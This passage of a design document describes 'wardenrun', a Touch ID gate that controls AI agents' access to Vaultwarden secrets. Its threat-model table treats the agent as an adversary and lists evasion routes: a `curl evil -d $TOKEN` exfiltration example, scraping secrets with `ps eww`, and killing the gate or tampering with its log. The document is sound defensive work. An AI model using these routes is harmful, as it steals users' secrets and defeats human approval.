| 5 | Inject code into wardenrun (`DYLD_*`, debugger) | Blocked | Hardened runtime (dyld drops `DYLD_*` before the program starts; tested for `DYLD_INSERT_LIBRARIES`), `PT_DENY_ATTACH`; as a second line `setup`/`run`/`new` refuse (78) to start with `DYLD_*` set or from a release build without the hardened runtime (debug builds may run unhardened; no environment switch) |
| 6 | Steer wardenrun into running a malicious `bw` (PATH, `NODE_OPTIONS`, edited config, replaced copy) and capture the master password | Mitigated | `bw` is called by pinned absolute path; its identity (Bitwarden's Team ID signature; the Node build is refused, 5.2 rule 1) is stored in the protected item; its environment is built from an allowlist; the copy is started suspended and the running process (not the path) is checked against the pinned signer, killed on mismatch; on rung a/b of 5.2.6 the master password is not in env or argv. Not covered: an older Bitwarden-signed release (no version floor), revocation (no network) |
| 7 | Replace the `wardenrun` binary or alias it | **Not protected.** Install dirs are user-writable and a fake dialog can phish. | `wardenrun doctor` checks the signature requirement and install location; the README publishes the certificate hash and says to verify |
| 8 | Approved command prints or sends the secret (`curl evil -d $TOKEN`, a script that logs it) | **Not protected** | That is why the dialog shows the full command line. Masking is an accident guard (raw, base64, URL, hex, JSON-escaped, shell-quoted), not an exfiltration barrier (`rev`, rot13, splitting beat it). |
| 9 | Read the injected env of a running child with `ps eww` | **Not protected for env injection** (tested; ordinary binaries leak, Apple platform binaries do not) | Prefer `--stdin` for tools that support it; keep commands short-lived; documented. Temp-file mode has the same exposure while the file exists. |
| 10 | Wear the user down with prompts | Mitigated | One pending prompt, cool-down after denials, every denial in the audit log |
| 11 | Tamper with the audit log | Detectable only against accidents and clumsy edits | Hash-chained lines without a key; the same user who knows the format can rewrite, truncate or delete the log |
| 12 | Steal the master password from wardenrun memory | Mitigated | `mlock`, zeroed after use, no core dumps, `PT_DENY_ATTACH` |
| 13 | Compromise of the Mac's stored password | Blast radius limited | Dedicated vault account, one collection (section 3.4 point 3) |
| 14 | Server impersonation | Mitigated | `https://` required (plain `http://` is refused by `bw`, even on loopback: tested, 5.2); `bw` verifies certificates |
| 15 | Re-run `wardenrun setup` pointing at an attacker's server or account | Blocked | Needs the master password typed at a terminal and a Touch ID approval showing old and new values (a terminal is not proof of a human, the approval is the gate) |
| 16 | While one approved run is in flight, read the master password or `BW_SESSION` from `bw`'s environment (`ps eww`; `bw` is not an Apple platform binary) and use `BW_SESSION` + `data.json` to decrypt the **whole cached collection** offline | **Not protected on rungs b and c** of 5.2.6: one approval can leak every item the dedicated account sees. Window of a few seconds, and it needs an agent polling `ps` at that moment. | Rung a (`bw serve` on a socketpair) removes both secrets from env and argv. The dedicated account bounds the damage to its one collection. This is the main reason PR3 starts with a spike. |
| 17 | Read the access/refresh tokens (or API-key secret) from wardenrun's `bw` profile (`data.json`, mode `0600`, same user) and call the Vaultwarden API as the dedicated account | **Not protected.** Can read the encrypted vault (offline guessing of a strong master password is the next step), and delete or alter items the account may write. | Dedicated account; long random master password; Argon2id; read-only collection permission when `new` is not used; `logout_after_run`; password login instead of API key (no long-lived secret on disk) |
| 18 | The maintainer's signing key leaks, or a malicious release is published | **Not protected for users who installed that release.** A binary signed with the leaked key passes the keychain ACL and could read the stored item after one approval. | Key only in a CI secret plus one offline backup; releases carry a GitHub Artifact Attestation and published hashes; certificate rotation procedure (everyone re-runs `setup`); `SECURITY.md` for reporting. Same trust anchor as any package maintainer. |
| 19 | The agent kills wardenrun with `kill -9` while a run is in progress | **Not protected, limited.** Catchable signals (`HUP`, `INT`, `QUIT`, `TERM`, `USR1`, `USR2`) end a run cleanly; `SIGKILL` cannot be caught, so a `--file` secret stays on disk and a `bw serve` that was already unlocked may keep running with no one holding its end of the private socket (to be checked by the integration tests, spike Q5). The agent learns no new secret from this; the window of an exposure that the approval already allowed gets longer. | Files are `0600` in a `0700` folder; the stale-process cleanup idea (pid file beside `bw.lock`, kill a stale group at the next acquire) is recorded and not built. |
| 20 | Bend an approved command through its environment or the files it reads (`PATH`, `~/.npmrc`, `.gitconfig`, tool variables that are not tagged) | **Not protected, limited.** An honest program can be made to run the agent's code or send the secret elsewhere; the sheet cannot show the whole environment. | Tags for risky variables (5.3); `--env`/`--file` targets that choose a program or a directory are refused (5.4); the injection targets are on the sheet and in the audit log; prefer `--stdin`. |

**Out of scope:** root or malware on the machine; a user who approves without reading;
a physically stolen unlocked Mac; the security of Vaultwarden/`bw` themselves.

## 7. Distribution

- **Formula only, no paid Apple account** (so no notarization, no `.app`, no cask).
  GitHub Actions builds a universal (arm64 + x86_64) binary on a macOS runner, signs it
  with the project's **self-signed code-signing certificate**, hardened runtime
  (`codesign -s <identity> -o runtime -i <fixed identifier>`), publishes a tarball with
  SHA-256 and a GitHub Artifact Attestation, and updates the formula in
  `mateuszgachowski/homebrew-tap`. The formula downloads the release tarball (no build on the
  user's machine) and depends on the `bw` CLI. Install:
  `brew install mateuszgachowski/tap/wardenrun`. Gatekeeper is not involved: a formula
  download made by `curl` carries no quarantine attribute (verified), which is also why a
  self-signed signature is enough.
- **Certificate:** generated once with `openssl`, 10-year validity, private key stored as a
  CI secret plus one offline backup; the SHA-1 of the certificate is the identity pinned in
  every user's keychain ACL, so it is published in the README and in `SECURITY.md`.
- **Release check that must be automated:** after `brew install`, `codesign -d -r-` must
  still print the project's designated requirement. Homebrew can re-sign or patch binaries
  in some install paths; if it does, the ACL no longer matches and the install is broken.
  This has not been tested yet and is the first thing PR6 verifies.
- Apple Silicon and Intel are both first-class (Intel Macs with a T2 chip have Touch ID too).
- Version pinning of `bw`: the formula declares the tested range; `doctor` warns outside it.

## 8. Testing

- Platform-neutral core is unit-tested and built on Linux CI too: masker (property tests
  with random chunk boundaries and all encodings), env sanitiser, argv/exec resolution,
  audit chain, config blob, `bw` driver against a fake `bw` that records its argv/env.
- **Security regression tests:** the secret never appears in the argv or env of any process
  wardenrun spawns except the approved child; never in the audit log; never on wardenrun's
  own stdout/stderr in `new`.
- **Integration:** real `bw` (pinned) against a Vaultwarden container on a Linux runner:
  login, unlock, get, create, collection restriction.
- **macOS CI (no fingerprint available):** `doctor`, signature flags, DYLD refusal,
  keychain ACL behaviour with a temporary keychain, `Approver` replaced by a fake.
- **Manual checklist for biometric flows** (documented in `docs/RELEASING.md`), run by the
  maintainer before each release.
- Every PR is reviewed by two independent reviewers before it is merged.

## 9. Repo layout and PR plan

```
Package.swift
Sources/WardenrunCore/   masker, audit, env, exec resolution, config, bw driver, protocols
Sources/WardenrunMac/    KeychainAclStore, BiometricApprover (LAContext), ProcessInspector, hardening
Sources/wardenrun/       CLI entry
Tests/...
docs/                    DESIGN.md, THREAT_MODEL.md, RELEASING.md
.github/workflows/       ci.yml, release.yml
LICENSE (MIT), README.md, SECURITY.md
```

1. Repo + README (all of section 12, written against this design before the code exists) +
   THREAT_MODEL + PR template with the "data flow updated" checkbox + CI skeleton (public
   repo, MIT).
2. Core: masker, audit log, env sanitiser, exec resolution, config blob.
3. `bw` driver + Vaultwarden integration tests. **Starts with a time-boxed spike** against a
   local Vaultwarden (TLS, self-signed CA via `NODE_EXTRA_CA_CERTS`) to settle the 5.2.6
   ladder (`bw serve` on a socketpair, `--passwordfile /dev/fd/N`, `--passwordenv`) and to
   measure real unlock/KDF time. If rung a fails, this design is amended before more code.
4. macOS: Tier B store, approver, hardening, `doctor`, `setup`.
5. `run` and `new` end to end.
6. Release pipeline (self-signed certificate, signing in CI, attestation), tap, check that
   the signature survives `brew install`, README final, maintainer install test.

Not planned: a Tier A (Developer ID, `.app`, cask) backend. The `SecretStore` protocol keeps
the door open for a contributor who has a paid account.

## 10. Linux later (designed for, not built)

Three protocols isolate everything platform-specific: `SecretStore`, `Approver`,
`ProcessInspector`. A Linux port would implement `Approver` with polkit or `fprintd` and a
`SecretStore` that is **not** a plain Secret Service entry (any same-user process can read
those; that would silently give the security level of option F in section 3.3). The honest Linux options are a
polkit-gated root helper or a TPM-sealed credential; this needs its own design.

## 11. Open decisions and design calls

**Decided by the maintainer**

1. **Signing-key custody (the price of not paying Apple).** Every release is signed with a
   self-signed certificate whose private key the maintainer keeps: a CI secret plus one
   offline backup in the maintainer's own password manager. Losing it means a new
   certificate and everyone re-running `setup`; leaking it is threat 18. Accepted by the
   maintainer on 2026-10-20. (Apple Developer Program: declined by the maintainer on
   2026-10-18.)

**Design calls** (open to review)

- Swift, SwiftPM, no dependencies; platform-neutral core plus a macOS layer.
- One-shot process, **no daemon**, no IPC. Costs about one KDF per use, removes an attack surface.
- Tier B only; the README says plainly that the Touch ID gate is enforced by wardenrun, not
  by the OS (`doctor` prints it too).
- Store the **master password** of a dedicated low-privilege account; settings that matter
  for security live inside the protected item, not in a config file.
- Biometrics-only approval; password fallback off by default (`approval = "biometrics-or-password"` opt-in).
- No Approve button; the biometric sheet is the only approval gesture, and it is also the
  only UI (no custom window). Commands that do not fit 400 characters are denied, not
  truncated (the system truncates silently at about 510).
- `bw` pinned by absolute path and signature/hash; environment built from an allowlist;
  all `bw` calls serialized under one lock.
- `sync` on every run; `list` plus exact-name match in wardenrun instead of `bw get <name>`.
- Password login at `setup` (tokens only on disk) rather than API-key login.
- Passwords for `new` are generated in wardenrun, not by `bw generate`.
- Hash-chained audit log at `~/Library/Logs/wardenrun/audit.jsonl`.
- `--stdin` injection mode in addition to env and temp file (because of the `ps eww` leak).
- An organization collection is required in v1 (personal-vault folders are not enough to
  scope a dedicated account).
- Config and state under `~/.config/wardenrun/` (portable to Linux).
- Extra commands beyond the original requirements: `setup`, `doctor`, `--no-store` fallback.

## 12. README requirements (maintainer requirement, 2026-10-18)

The README has to make it obvious to a non-expert **what is going on, which way the data
flows, what the app can reach and what it cannot**. This is part of the product: a secrets
tool that people cannot understand is a tool they cannot trust. Required content:

1. **One-screen summary:** the problem, a three-line terminal example, who it is for, what it
   needs (`bw`, Vaultwarden >= 1.37.4 over HTTPS, a dedicated vault account).
2. **Data-flow diagram plus a numbered walkthrough** of one `run` (and one `new`):
   agent, wardenrun, Touch ID sheet, keychain, `bw`, Vaultwarden, wardenrun's memory, child
   process, masked output back to the agent. **Every arrow says what travels** (command line,
   master password, session key, item JSON, secret value) **and how** (argv, env, pipe,
   socket, file), and whether another process of the same user could observe it.
3. **"What wardenrun can reach / cannot reach" table.**
   - *Can:* its own keychain item; the one collection of the dedicated account; the command
     line, stdout and stderr of the child it launches; the names of the parent processes; its
     own state directory and audit log.
   - *Cannot / does not:* your personal vault or other collections; any other keychain item;
     your fingerprint (the OS returns only yes or no); the agent's conversation; any network
     host except your Vaultwarden server, and only through `bw`. No telemetry, no update
     check, no cloud service.
   - A mirror table for the agent: what it can never get, and what it can still see.
4. **Where data lives at rest:** the keychain item (what is in it), the `bw` profile
   directory (tokens, encrypted vault), the audit log (what is in it, never values),
   temporary files (when they exist and for how long).
5. **A plain statement of the security level:** which gate is enforced by wardenrun and which
   by the OS, and the "not protected" rows of the threat model in everyday words.
6. **Prior art, honestly** (see "Compared to what exists" in the README) and why this exists.
7. **Verify, do not trust:** the certificate hash and how to check the signature,
   `wardenrun doctor`, how to read the audit log, a pointer to the few files that hold the
   security-critical logic, and the statement that wardenrun itself makes no network calls.
8. **Use with Claude Code and other AI agents**, and the line that the project is **not
   affiliated with Bitwarden** (Vaultwarden is named factually).
9. **Style:** plain language, diagrams over prose, examples on `vault.example.com`, no
   names from anyone's private infrastructure.

**Keeping it true:** the data-flow section is treated like code. Any PR that changes a data
path (what is passed to `bw`, where a secret is written, what is logged, what the child
receives) updates the diagram and the tables in the same PR; the PR template has a checkbox
for it and both reviewers are told to check it.

## 13. Sources

- Apple TN3137 *On Mac keychain APIs and implementations*, TN3125 *Inside Code Signing:
  Provisioning Profiles*, *Signing a daemon with a restricted entitlement*, forum thread 125510.
- `maxgoedjen/secretive` (`Sources/SecretAgent/SecretAgent.entitlements`, README).
- `bitwarden/clients`: `apps/desktop/src/key-management/biometrics/os-biometrics-mac.service.ts`,
  `apps/desktop/desktop_native/core/src/password/macos.rs`,
  `.../process_isolation/macos.rs`.
- Homebrew 5.0.0 release notes (brew.sh/2025/11/12/homebrew-5.0.0/).
- Unverified lead on free Apple ID signing: <https://flaviocopes.com/apple-developer-free-vs-paid/>
  (secondary source; Apple's capability table could not be read as text).
- `Homebrew/homebrew-core` `Formula/b/bitwarden-cli.rb` (a Node script; `depends_on "node"`).
- `bitwarden/clients` tag `cli-v2026.10.0`, `apps/cli/src`: `key-management/commands/unlock.command.ts`,
  `auth/commands/login.command.ts`, `commands/get.command.ts`, `commands/list.command.ts`,
  `vault/create.command.ts`, `commands/serve.command.ts`, `platform/services/lowdb-storage.service.ts`,
  `platform/services/cli-platform-utils.service.ts`; `libs/common/.../token.service.ts`,
  `libs/unlock/src/lock.service.ts`; docs at bitwarden.com/help/cli/.
- Vaultwarden compatibility: Vaultwarden PRs #7693, #7750, #7820, #7829; `bitwarden/clients#23937`,
  `#23828`.
